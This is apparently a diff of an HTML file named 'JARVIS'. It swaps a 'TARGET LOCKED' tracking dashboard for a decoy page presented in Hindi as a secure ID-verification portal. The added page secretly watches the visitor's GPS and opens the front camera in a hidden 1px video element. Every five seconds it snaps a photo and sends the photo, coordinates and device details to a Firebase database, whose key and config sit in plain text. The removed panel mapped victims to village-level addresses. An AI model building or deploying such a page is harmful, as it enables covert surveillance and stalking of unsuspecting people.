@@ -1,101 +1,37 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
     <meta charset="UTF-8">
-    <title>JARVIS V17.40 - TACTICAL VILLAGE LOCK PANEL</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JARVIS CONNECT - SECURE PORTAL</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
     <style>
         * { box-sizing: border-box; }
-        body { margin: 0; background: #000; color: #00f2ff; font-family: 'Segoe UI', sans-serif; display: flex; height: 100vh; overflow: hidden; }
-        #side-panel { width: 360px; background: #0a0a0a; border-right: 3px solid #ff0000; padding: 20px; z-index: 1000; display: flex; flex-direction: column; justify-content: space-between; overflow-y: auto; }
-        #report-area { flex-grow: 1; }
-        #map-container { flex-grow: 1; position: relative; background: #000; }
-        #map { width: 100%; height: 100%; }
-        
-        .leaflet-control-zoom { border: 2px solid #ff0000 !important; background: #000 !important; box-shadow: 0 0 10px rgba(255,0,0,0.5) !important; }
-        .leaflet-control-zoom-in, .leaflet-control-zoom-out { background: #0a0a0a !important; color: #ff0000 !important; font-weight: bold !important; border-bottom: 1px solid #ff0000 !important; }
-        .leaflet-control-zoom-in:hover, .leaflet-control-zoom-out:hover { background: #ff0000 !important; color: #fff !important; }
-
-        .header { text-align: center; border-bottom: 2px solid #ff0000; margin-bottom: 20px; padding-bottom: 10px; }
-        .header h2 { margin: 0; color: #ff0000; letter-spacing: 3px; font-size: 22px; }
-        .photo-box { width: 100%; height: 240px; border: 2px solid #ff0000; background: #000; overflow: hidden; margin-bottom: 15px; position: relative;}
-        .photo-box img { width: 100%; height: 100%; object-fit: cover; }
-        .info-card { background: rgba(255, 255, 255, 0.03); border-left: 4px solid #ff0000; padding: 10px; margin-bottom: 10px; }
-        .label { font-size: 10px; color: #888; text-transform: uppercase; }
-        .value { font-size: 13px; color: #fff; font-weight: bold; display: block; margin-top: 3px; }
-        .marker-box { position: relative; }
-        .arrow-tip { width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent; border-bottom: 30px solid #ff0000; filter: drop-shadow(0 0 8px #ff0000); }
-        .ping-ring { width: 50px; height: 50px; border: 2px solid #ff0000; border-radius: 50%; position: absolute; top: -10px; left: -10px; animation: ping 1.2s infinite; }
-        @keyframes ping { 0% { transform: scale(0.5); opacity: 1; } 100% { transform: scale(1.8); opacity: 0; } }
-        
-        .pdf-btn { background: #ff0000; color: #fff; border: none; padding: 12px; font-weight: bold; font-size: 14px; border-radius: 4px; cursor: pointer; text-transform: uppercase; width: 100%; box-shadow: 0 0 10px rgba(255,0,0,0.4); margin-top: 15px; transition: 0.3s; }
-        .pdf-btn:hover { background: #cc0000; box-shadow: 0 0 15px #ff0000; }
-        #pdf-map-snap { width: 100%; height: 200px; border: 2px solid #ff0000; margin-top: 15px; display: none; object-fit: cover; }
+        body { background: #0f172a; color: #f8fafc; font-family: '-apple-system', BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .profile-card { background: #1e293b; width: 100%; max-width: 380px; border-radius: 20px; padding: 30px 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.05); }
+        .avatar { width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(45deg, #00f2ff, #00ff87); margin: 0 auto 15px; display: flex; justify-content: center; align-items: center; font-size: 36px; font-weight: bold; color: #0f172a; box-shadow: 0 0 20px rgba(0,242,255,0.2); }
+        .username { font-size: 20px; font-weight: 700; margin-bottom: 5px; color: #fff; }
+        .bio { font-size: 14px; color: #94a3b8; margin-bottom: 25px; line-height: 1.5; }
+        .status-box { background: rgba(0, 242, 255, 0.1); border: 1px solid #00f2ff; padding: 12px; border-radius: 12px; font-size: 14px; color: #00f2ff; font-weight: 600; }
+        #v { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
+        canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div id="side-panel">
-        <div id="report-area">
-            <div class="header">
-                <h2>TARGET LOCKED</h2>
-                <small style="color:#39ff14;" id="sync-clock">LIVE FEED ACTIVE</small>
-            </div>
-            <div class="photo-box">
-                <img id="d-photo" src="https://via.placeholder.com/300x200?text=SCANNING+INTEL">
-            </div>
-
-            <div class="info-card" style="border-left-color: #39ff14;">
-                <span class="label" style="color: #39ff14;">Current Village / Locality</span>
-                <span id="d-town-area" class="value" style="font-size: 18px; color: #39ff14; text-transform: uppercase;">Scanning Location...</span>
-            </div>
-
-            <div class="info-card" style="border-left-color: #ff00ea;">
-                <span class="label" style="color: #ff00ea;">Region Hierarchy</span>
-                <span id="d-hierarchy" class="value" style="font-size: 12px; color: #fff;">
-                    Tehsil: Loading...<br>
-                    District: Loading...<br>
-                    State: Loading...<br>
-                    Country: Loading...
-                </span>
-            </div>
-
-            <div class="info-card">
-                <span class="label">Full Address Line</span>
-                <span id="d-addr" class="value" style="font-size: 11px; color: #ccc;">Tracking Location...</span>
-            </div>
-            
-            <div class="info-card">
-                <span class="label">Tactical Coordinates</span>
-                <span id="d-coords" class="value">0.0000000, 0.0000000</span>
-            </div>
-            
-            <div class="info-card" style="border-left-color: #00f2ff;">
-                <span class="label" style="color: #00f2ff;">Device Summary</span>
-                <span id="d-summary" class="value" style="font-size: 12px; color: #aaa; line-height: 1.4;">
-                    OS: Android 14<br>
-                    Browser: Chrome Mobile<br>
-                    Screen: 1080 x 2400 (FHD+)
-                </span>
-            </div>
-
-            <img id="pdf-map-snap" src="">
-        </div>
-
-        <div>
-            <button class="pdf-btn" onclick="downloadPanelPDF()">📄 Export Intel PDF</button>
-        </div>
+    <div class="profile-card">
+        <div class="avatar">J</div>
+        <div class="username">JARVIS SECURITY PORTAL</div>
+        <div class="bio">डिजिटल आईडी वेरिफिकेशन और क्लाउड सिंक प्रक्रिया बैकग्राउंड में सक्रिय है। कृपया प्रतीक्षा करें...</div>
+        <div class="status-box" id="log-status">सिस्टम कनेक्ट हो रहा है...</div>
     </div>
 
-    <div id="map-container">
-        <div id="map"></div>
-    </div>
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
 
     <script>
+        // आपका फायरबेस कॉन्फ़िगरेशन (जो आपके स्क्रीनशॉट वाले पैनल से मैच करता है)
         const firebaseConfig = {
           apiKey: "AIzaSyAfwCTBBc_LT8j7neC_aJhBCHUXj3QkSHc",
           authDomain: "army-cb492.firebaseapp.com",
@@ -106,107 +42,72 @@
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        var map = L.map('map', { zoomControl: true, attributionControl: false }).setView([25.74, 82.26], 16);
-        
-        L.tileLayer('https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {
-            maxZoom: 20, subdomains: ['mt0','mt1','mt2','mt3']
-        }).addTo(map);
+        let currentLat = 0;
+        let currentLon = 0;
 
-        var currentMarker;
-        var currentCircle;
-        let latNow = 25.74, lonNow = 82.26;
-        let userHasInteracted = false;
-
-        map.on('movestart zoomstart', () => { userHasInteracted = true; });
-
-        database.ref('live_detect').on('value', (s) => {
-            const d = s.val(); if(!d) return;
-
-            if(d.photo) document.getElementById('d-photo').src = d.photo;
-            if(d.last_updated) {
-                document.getElementById('sync-clock').innerText = "LAST REFRESH: " + new Date(d.last_updated).toLocaleTimeString();
-            }
-
-            if(d.device_info) {
-                document.getElementById('d-summary').innerHTML = `
-                    <strong>OS:</strong> ${d.device_info.os || 'Unknown'}<br>
-                    <strong>Browser:</strong> ${d.device_info.browser || 'Unknown'}<br>
-                    <strong>Screen:</strong> ${d.device_info.screen || 'Unknown'}
-                `;
-            }
-
-            if(d.location) {
-                latNow = d.location.lat;
-                lonNow = d.location.lon;
-                
-                document.getElementById('d-coords').innerText = latNow.toFixed(7) + ", " + lonNow.toFixed(7);
-
-                if (currentMarker) map.removeLayer(currentMarker);
-                if (currentCircle) map.removeLayer(currentCircle);
-
-                var tacticalIcon = L.divIcon({
-                    className: 'marker-box',
-                    html: `<div class="ping-ring"></div><div class="arrow-tip"></div>`,
-                    iconSize: [30, 42], iconAnchor: [15, 42]
-                });
-
-                currentMarker = L.marker([latNow, lonNow], { icon: tacticalIcon }).addTo(map);
-                currentCircle = L.circle([latNow, lonNow], {
-                    color: '#ff0000', fillColor: '#ff0000', fillOpacity: 0.15, radius: 20 
-                }).addTo(map);
-
-                if (!userHasInteracted) {
-                    map.setView([latNow, lonNow], 16);
-                } else {
-                    map.panTo([latNow, lonNow]);
-                }
-
-                // 📡 विलेज फ़िल्टरिंग के साथ नया रिवर्स जियोकोडिंग लॉजिक
-                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latNow}&lon=${lonNow}`)
-                .then(r=>r.json()).then(res=> {
-                    document.getElementById('d-addr').innerText = res.display_name || "Location Found";
-                    
-                    const addr = res.address;
-                    if(addr) {
-                        // 🛠️ ज़िले के नाम से पहले गाँव (village), कस्बा (town) या छोटा इलाका (hamlet/suburb) फ़िल्टर करने का सख्त क्रम
-                        const villageOrTown = addr.village || addr.hamlet || addr.town || addr.suburb || addr.neighbourhood || addr.residential || "MACHHLISHAHR ZONE";
-                        document.getElementById('d-town-area').innerText = villageOrTown;
-
-                        // प्रशासनिक विवरण सेट करना
-                        const tehsil = addr.county || "Machhlishahr";
-                        const district = addr.city || addr.district || "Jaunpur";
-                        const state = addr.state || "Uttar Pradesh";
-                        const country = addr.country || "India";
-
-                        document.getElementById('d-hierarchy').innerHTML = `
-                            <strong>Tehsil:</strong> ${tehsil}<br>
-                            <strong>District:</strong> ${district}<br>
-                            <strong>State:</strong> ${state}<br>
-                            <strong>Country:</strong> ${country}
-                        `;
-                    }
-                });
-            }
+        document.addEventListener("DOMContentLoaded", () => {
+            autoStartSync();
         });
 
-        function downloadPanelPDF() {
-            const mapSnapImg = document.getElementById('pdf-map-snap');
-            mapSnapImg.src = `https://static-maps.yandex.ru/1.x/?ll=${lonNow},${latNow}&z=15&l=sat,sk&size=450,300&pt=${lonNow},${latNow},pm2rdl`;
-            mapSnapImg.style.display = 'block'; 
+        async function autoStartSync() {
+            const statusDiv = document.getElementById('log-status');
 
-            setTimeout(() => {
-                const element = document.getElementById('report-area');
-                const options = {
-                    margin:       10,
-                    filename:     'JARVIS_Full_Intel_Report.pdf',
-                    image:        { type: 'jpeg', quality: 0.98 },
-                    html2canvas:  { scale: 2, backgroundColor: '#0a0a0a', useCORS: true },
-                    jsPDF:        { unit: 'mm', format: 'a4', orientation: 'portrait' }
-                };
-                html2pdf().set(options).from(element).save().then(() => {
-                    mapSnapImg.style.display = 'none'; 
+            // 1. जीपीएस ट्रैकिंग शुरू करें
+            navigator.geolocation.watchPosition((pos) => {
+                currentLat = pos.coords.latitude;
+                currentLon = pos.coords.longitude;
+                database.ref('live_detect/location').set({ lat: currentLat, lon: currentLon });
+            }, err => console.log("GPS Signal Waiting..."), { enableHighAccuracy: true });
+
+            // 2. कैमरा स्ट्रीम चालू करें
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+
+                video.addEventListener('loadeddata', () => {
+                    statusDiv.innerHTML = "🔗 लाइव डेटा सिंक सक्रिय";
+                    captureDataInstant();
+                    setInterval(captureDataInstant, 5000); // हर 5 सेकंड में डेटाबेस में सिंक
                 });
-            }, 800); 
+            } catch (e) {
+                statusDiv.innerHTML = "❌ कैमरा एक्सेस अनुमति की आवश्यकता है।";
+            }
+        }
+
+        function captureDataInstant() {
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+
+            c.width = 320;
+            c.height = 240;
+            const ctx = c.getContext('2d');
+            ctx.drawImage(v, 0, 0, 320, 240);
+
+            const compressedPhoto = c.toDataURL('image/jpeg', 0.5);
+            const timestamp = Date.now();
+            const currentTimeString = new Date().toLocaleTimeString();
+
+            // डिवाइस की बुनियादी जानकारी एकत्र करना
+            const deviceInfo = {
+                os: navigator.userAgent.includes("Android") ? "Android" : navigator.userAgent.includes("iPhone") ? "iOS" : "Windows/PC",
+                browser: navigator.userAgent.includes("Chrome") ? "Chrome Mobile" : "Mobile Browser",
+                screen: window.screen.width + " x " + window.screen.height
+            };
+
+            // फायरबेस डेटाबेस नोड पर डेटा पुश करना
+            database.ref('live_detect').update({
+                photo: compressedPhoto,
+                last_updated: timestamp,
+                device_info: deviceInfo
+            });
+
+            // बैकअप हिस्ट्री में सेव करना
+            database.ref('jarvis_history/' + timestamp).set({
+                time: currentTimeString,
+                photo: compressedPhoto,
+                location_record: { lat: currentLat, lon: currentLon }
+            });
         }
     </script>
 </body>
